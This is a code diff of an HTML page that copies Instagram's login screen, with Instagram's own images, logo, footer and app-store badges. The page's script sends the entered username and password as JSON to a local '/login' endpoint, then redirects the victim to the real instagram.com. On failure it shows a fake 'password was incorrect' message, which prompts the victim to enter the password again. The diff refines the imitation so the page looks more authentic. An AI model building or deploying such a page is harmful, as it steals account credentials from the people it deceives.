@@ -4,54 +4,159 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <link rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #fafafa;
             margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-        }
-        .container {
-            width: 350px;
-            display: flex;
             flex-direction: column;
         }
-        .card {
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 32px;
+            padding-bottom: 32px;
+        }
+
+        .phones-container {
+            background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk');
+            background-size: 468.32px 634.15px;
+            height: 581.15px;
+            width: 380.32px;
+            margin-right: 32px;
+            position: relative;
+        }
+
+        .screenshot-slider {
+            margin: 27px 0 0 113px;
+            position: relative;
+        }
+
+        .screenshot-slider img {
+            height: 538.84px;
+            width: 250px;
+            position: absolute;
+            opacity: 0;
+            transition: opacity 1.5s ease-in-out;
+        }
+
+        .screenshot-slider img.active {
+            opacity: 1;
+        }
+
+        .right-column {
+            display: flex;
+            flex-direction: column;
+            width: 350px;
+        }
+
+        .login-panel {
             background-color: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 1px;
-            padding: 20px 40px;
+            padding: 10px 0;
             margin-bottom: 10px;
-            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
+
         .logo {
-            margin: 22px auto 12px;
-            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wJeze.png");
+            margin: 36px 0 12px 0;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png");
             background-position: 0 -52px;
             background-size: 176px 181px;
             height: 51px;
             width: 175px;
-            display: block;
+            background-repeat: no-repeat;
+            display: inline-block;
         }
-        input {
+
+        .form-container {
             width: 100%;
+            padding: 0 40px;
+            box-sizing: border-box;
+            margin-top: 24px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 6px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 9px 0 7px 8px;
-            margin-bottom: 6px;
+            height: 38px;
+        }
+
+        .input-wrapper:focus-within {
+            border: 1px solid #a8a8a8;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            padding: 9px 8px 7px 8px;
             font-size: 12px;
             box-sizing: border-box;
             outline: none;
+            z-index: 2;
+            position: relative;
         }
-        input:focus {
-            border: 1px solid #a8a8a8;
+
+        .floating-label {
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            font-size: 12px;
+            transition: all 0.1s ease-out;
+            pointer-events: none;
+            z-index: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            right: 8px;
         }
-        .btn {
+
+        .input-wrapper input:not(:placeholder-shown) + .floating-label,
+        .input-wrapper input:focus + .floating-label {
+            transform: translateY(-12px) scale(0.83);
+            transform-origin: left;
+        }
+
+        .input-wrapper input:not(:placeholder-shown),
+        .input-wrapper input:focus {
+            padding: 14px 8px 2px 8px;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            color: #262626;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+            z-index: 3;
+            padding: 0;
+        }
+
+        .login-btn {
             width: 100%;
             background-color: #0095f6;
             color: #fff;
@@ -62,26 +167,37 @@
             margin-top: 8px;
             cursor: pointer;
             font-size: 14px;
+            height: 30px;
+            opacity: 0.7;
+            pointer-events: none;
+            transition: opacity 0.2s;
         }
-        .btn:disabled {
-            background-color: #b2dffc;
+
+        .login-btn.active {
+            opacity: 1;
+            pointer-events: auto;
         }
+
         .divider {
             display: flex;
             align-items: center;
-            margin: 10px 0 18px;
+            margin: 10px 40px 18px;
+            width: calc(100% - 80px);
         }
+
         .line {
             height: 1px;
             background-color: #dbdbdb;
             flex: 1;
         }
-        .or {
+
+        .or-text {
             color: #8e8e8e;
             font-size: 13px;
             font-weight: 600;
             margin: 0 18px;
         }
+
         .fb-login {
             color: #385185;
             font-weight: 600;
@@ -92,61 +208,278 @@
             align-items: center;
             margin: 8px 0;
         }
-        .forgot {
+
+        .fb-icon {
+            display: inline-block;
+            margin-right: 8px;
+            position: relative;
+            top: 1px;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png");
+            background-position: -414px -259px;
+            background-size: 440px 411px;
+            width: 16px;
+            height: 16px;
+        }
+
+        .forgot-password {
             font-size: 12px;
             color: #00376b;
             text-decoration: none;
             margin-top: 12px;
-            display: block;
+            margin-bottom: 12px;
         }
-        .signup-text {
+
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 0;
+            text-align: center;
             font-size: 14px;
-            margin: 15px;
+            margin-bottom: 10px;
         }
-        .signup-text a {
+
+        .signup-box a {
             color: #0095f6;
-            font-weight: 600;
             text-decoration: none;
+            font-weight: 600;
+        }
+
+        .get-app {
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0 20px 0;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .app-stores img {
+            height: 40px;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 24px;
+            max-width: 1000px;
+            gap: 16px;
+            padding-bottom: 52px;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 800px) {
+            .phones-container {
+                display: none;
+            }
+            .main-container {
+                margin-top: 0;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <span class="logo"></span>
-            
-            <form id="login-form" style="margin-top: 24px;" onsubmit="handleLogin(event)">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button type="submit" class="btn">Log In</button>
-            </form>
-            
-            <div class="divider">
-                <div class="line"></div>
-                <div class="or">OR</div>
-                <div class="line"></div>
+    <div class="main-container">
+        <div class="phones-container">
+            <div class="screenshot-slider">
+                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png?__makehaste_cache_breaker=HOgRclNOosk" class="active" alt="">
+                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot2-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
+                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot3-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
+                <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot4-2x.png?__makehaste_cache_breaker=HOgRclNOosk" alt="">
             </div>
-            
-            <a href="#" class="fb-login">Log in with Facebook</a>
-            <a href="#" class="forgot">Forgot password?</a>
         </div>
-        
-        <div class="card" style="padding: 10px 0;">
-            <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+
+        <div class="right-column">
+            <div class="login-panel">
+                <span class="logo"></span>
+                
+                <div class="form-container">
+                    <form onsubmit="submitLogin(event)" id="loginForm">
+                        <div class="input-wrapper">
+                            <input type="text" id="username" placeholder=" " oninput="checkInputs()" required>
+                            <span class="floating-label">Phone number, username, or email</span>
+                        </div>
+                        
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder=" " oninput="checkInputs()" required>
+                            <span class="floating-label">Password</span>
+                            <button type="button" class="show-password" onclick="togglePassword()" id="showPassBtn">Show</button>
+                        </div>
+
+                        <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
+                        
+                        <div class="divider">
+                            <div class="line"></div>
+                            <div class="or-text">OR</div>
+                            <div class="line"></div>
+                        </div>
+
+                        <a href="#" class="fb-login">
+                            <span class="fb-icon"></span>
+                            Log in with Facebook
+                        </a>
+
+                        <a href="#" class="forgot-password" style="display: block; text-align: center;">Forgot password?</a>
+                    </form>
+                </div>
+            </div>
+
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-stores">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Pc7U52p3p.png" alt="Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Top Accounts</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+        <div style="width: 100%; text-align: center; margin-top: 10px;">
+            <select style="border: none; background: transparent; color: #8e8e8e; font-size: 12px; cursor: pointer;">
+                <option value="en">English</option>
+                <option value="fr">Français</option>
+                <option value="es">Español</option>
+            </select>
+            <span style="margin-left: 16px;">© 2024 Instagram from Meta</span>
         </div>
     </div>
 
     <script>
-        function handleLogin(event) {
+        // Image slider
+        const images = document.querySelectorAll('.screenshot-slider img');
+        let currentImage = 0;
+
+        setInterval(() => {
+            images[currentImage].classList.remove('active');
+            currentImage = (currentImage + 1) % images.length;
+            images[currentImage].classList.add('active');
+        }, 4000);
+
+        function checkInputs() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const showPassBtn = document.getElementById('showPassBtn');
+
+            if (username.length >= 1 && password.length >= 6) {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+
+            if (password.length > 0) {
+                showPassBtn.style.display = 'block';
+            } else {
+                showPassBtn.style.display = 'none';
+            }
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const showPassBtn = document.getElementById('showPassBtn');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showPassBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showPassBtn.textContent = 'Show';
+            }
+        }
+
+        function submitLogin(event) {
             event.preventDefault();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
             
+            if (!username || !password) return;
+
+            const originalContent = btn.innerHTML;
+            btn.innerHTML = '<div class="spinner"></div>';
+            btn.disabled = true;
+            btn.classList.remove('active');
+
             fetch('/login', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: username, password: password})
-            }).then(res => {
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: username,
+                    password: password
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    btn.innerHTML = originalContent;
+                    btn.disabled = false;
+                    btn.classList.add('active');
+                    
+                    // Show error
+                    const errorP = document.createElement('p');
+                    errorP.style.color = '#ed4956';
+                    errorP.style.fontSize = '14px';
+                    errorP.style.textAlign = 'center';
+                    errorP.style.marginBottom = '15px';
+                    errorP.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                    
+                    const formContainer = document.querySelector('.form-container');
+                    const existingError = formContainer.querySelector('p');
+                    if (existingError) {
+                        existingError.remove();
+                    }
+                    formContainer.insertBefore(errorP, document.getElementById('loginForm'));
+                }
+            }).catch(error => {
+                console.error('Error:', error);
                 window.location.href = "https://www.instagram.com/";
             });
         }
